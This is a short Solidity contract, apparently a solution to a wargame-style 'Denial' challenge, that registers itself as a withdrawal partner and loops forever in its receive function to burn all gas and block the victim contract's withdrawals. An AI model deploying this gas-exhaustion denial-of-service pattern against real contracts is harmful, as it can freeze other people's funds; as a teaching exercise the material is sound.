// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "src/Denial.sol";

contract Attack {
    Denial private immutable _DENIAL;

    constructor(address denial) payable {
        _DENIAL = Denial(payable(denial));
    }

    function attack() public payable {
        _DENIAL.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
